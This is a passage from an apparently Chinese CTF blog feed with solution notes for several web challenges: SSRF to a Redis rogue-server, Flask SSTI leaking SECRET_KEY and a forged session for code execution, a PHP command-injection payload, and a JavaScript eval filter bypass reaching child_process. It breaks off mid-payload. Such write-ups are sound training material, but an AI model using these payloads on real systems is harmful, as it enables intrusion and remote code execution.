        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无语，去年做过，今天再做又做不来了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">' is inner ip'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Please visit hint.php locally.</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>先读取hint.php</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;hint.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpif($_SERVER['REMOTE_ADDR']==="127.0.0.1")&#123;  highlight_file(__FILE__);&#125;if(isset($_POST['file']))&#123;  file_put_contents($_POST['file'],"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'redispass is root'</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span></span>);&#125;"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了下不知道为啥文件写不进不去，不然可以考虑伪协议绕过死亡exit。</p><p>不过这里提示了redis和redis pass</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914144919513.png"></p><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><blockquote><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p></blockquote><p>更改<code>rogue-server.py</code>文件端口，然后<code>python rogue-server.py</code>启动redis服务器</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914190807908.png"></p><p>构造payload</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914190725882.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914190901232.png"></p><p>生成payload，然后打入</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914190934507.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/image-20210914191029108.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[watevrCTF-2019]Supercalc</title>
      <link href="/p/1429696811.html"/>
      <url>/p/1429696811.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[SSTI|flask session构造]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914111100333.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>扫了下目录，没啥发现</p><p>解下session，看来是flask？</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914125031207.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124026007.png"></p><p>打<code>&#123;&#123;1+1&#125;&#125;</code>提示</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124215231.png"></p><p>输入<code>1/0#&#123;&#123;1+1&#125;&#125;</code>能拿到结果。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124259336.png"></p><p>输入<code>1/0#&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124443114.png"></p><p>试了一些RCE代码，不太行，应该有过滤。</p><p>所以先看看<code>&#123;&#123;config&#125;&#125;</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124937130.png"></p><p>转个码</p><pre class="line-numbers language-none"><code class="language-none">&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093&#125;&gt;ZeroDivisionError: division by zero<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中<code>&#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;</code></p><p>然后思路就很明显了，伪造session-&gt;服务端读取-&gt;执行代码，这样就能绕过过滤。</p><p>用这个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterfacesecret_key <span class="token operator">=</span> <span class="token string">"cded826a1e89925035cc05f0907855f7"</span><span class="token keyword">class</span> <span class="token class-name">FakeApp</span><span class="token punctuation">:</span>    secret_key <span class="token operator">=</span> secret_keyfake_app <span class="token operator">=</span> FakeApp<span class="token punctuation">(</span><span class="token punctuation">)</span>session_interface <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>serializer <span class="token operator">=</span> session_interface<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>fake_app<span class="token punctuation">)</span>cookie <span class="token operator">=</span> serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>    <span class="token punctuation">&#123;</span><span class="token string">"history"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'__import__("os").popen("ls ").read()'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者是<code>flask-session-cookie-manager</code></p><p>这还得加转义，这么看还是上面那个脚本方便点。</p><pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;history&#39;: [&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;ls \&quot;).read()&#39;&#125;]&#125;&quot; -s &quot;cded826a1e89925035cc05f0907855f7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914125955481.png"></p><p>改下命令，读取，结束</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914130639837.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:EasyBypass</title>
      <link href="/p/2826789871.html"/>
      <url>/p/2826789871.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[system绕过]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"#flag in /flag"</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm1</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm2</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file <span class="token interpolation"><span class="token variable">$comm1</span></span> <span class="token interpolation"><span class="token variable">$comm2</span></span>"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class="line-numbers language-none"><code class="language-none">?comm1&#x3D;index.php&quot;;tac &#x2F;fla?&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NPUCTF2020]验证🐎</title>
      <link href="/p/3947461522.html"/>
      <url>/p/3947461522.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[验证码|JavaScript|无字母数字|js弱类型]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913104308943.png"></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">const express &#x3D; require(&#39;express&#39;);const bodyParser &#x3D; require(&#39;body-parser&#39;);const cookieSession &#x3D; require(&#39;cookie-session&#39;);const fs &#x3D; require(&#39;fs&#39;);const crypto &#x3D; require(&#39;crypto&#39;);const keys &#x3D; require(&#39;.&#x2F;key.js&#39;).keys;function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;function saferEval(str) &#123;  if (str.replace(&#x2F;(?:Math(?:\.\w+)?)|[()+\-*&#x2F;&amp;|^%&lt;&gt;&#x3D;,?:]|(?:\d+\.?\d*(?:e\d+)?)| &#x2F;g, &#39;&#39;)) &#123;    return null;  &#125;  return eval(str);&#125; &#x2F;&#x2F; 2020.4&#x2F;WORKER1 淦，上次的库太垃圾，我自己写了一个const template &#x3D; fs.readFileSync(&#39;.&#x2F;index.html&#39;).toString();function render(results) &#123;  return template.replace(&#39;&#123;&#123;results&#125;&#125;&#39;, results.join(&#39;&lt;br&#x2F;&gt;&#39;));&#125;const app &#x3D; express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;  name: &#39;PHPSESSION&#39;, &#x2F;&#x2F; 2020.3&#x2F;WORKER2 嘿嘿，给👴爪⑧  keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#39;&#x2F;&#39;, function (req, res) &#123;  let result &#x3D; &#39;&#39;;  const results &#x3D; req.session.results || [];  const &#123; e, first, second &#125; &#x3D; req.body;  if (first &amp;&amp; second &amp;&amp; first.length &#x3D;&#x3D;&#x3D; second.length &amp;&amp; first!&#x3D;&#x3D;second &amp;&amp; md5(first+keys[0]) &#x3D;&#x3D;&#x3D; md5(second+keys[0])) &#123;    if (req.body.e) &#123;      try &#123;        result &#x3D; saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;      &#125; catch (e) &#123;        console.log(e);        result &#x3D; &#39;Wrong Wrong Wrong!!!&#39;;      &#125;      results.unshift(&#96;$&#123;req.body.e&#125;&#x3D;$&#123;result&#125;&#96;);    &#125;  &#125; else &#123;    results.unshift(&#39;Not verified!&#39;);  &#125;  if (results.length &gt; 13) &#123;    results.pop();  &#125;  req.session.results &#x3D; results;  res.send(render(req.session.results));&#125;);&#x2F;&#x2F; 2019.10&#x2F;WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#39;&#x2F;source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;javascript;charset&#x3D;utf-8&#39;);  res.send(fs.readFileSync(&#39;.&#x2F;index.js&#39;));&#125;);app.get(&#39;&#x2F;&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;html;charset&#x3D;utf-8&#39;);  req.session.admin &#x3D; req.session.admin || 0;  res.send(render(req.session.results &#x3D; req.session.results || []))&#125;);app.listen(80, &#39;0.0.0.0&#39;, () &#x3D;&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>显然，绕过过滤命令执行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913104458507.png"></p><blockquote><p>?:表示不捕获分组</p></blockquote><p>取<code>Function</code>字样</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913131303033.png"></p><p>然后就可以这样执行js代码。</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">let a&#x3D;Math.constructor.constructorconsole.log(a(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;dir&#39;).toString()&quot;)())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但这里只允许数字不允许字符串，可以利用<code>String.fromCharCode()</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"return process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token punctuation">&#125;</span></span><span class="token string">').toString()"</span></span>    <span class="token keyword">return</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>gen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后利用字符串拼接凑出<code>String</code></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">Math+1 &#x2F;&#x2F;&quot;[object Math]1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再利用箭头函数自调用<code>(()=&gt;())()</code></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">let a &#x3D; function () &#123;    console.log(&quot;123123&quot;);&#125;;a();let b &#x3D; (x) &#x3D;&gt; &#123;    console.log(x);&#125;;b(123);let c &#x3D; (x) &#x3D;&gt; console.log(x);c(123);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">Math</span><span class="token operator">=></span><span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span>constructor<span class="token punctuation">,</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token 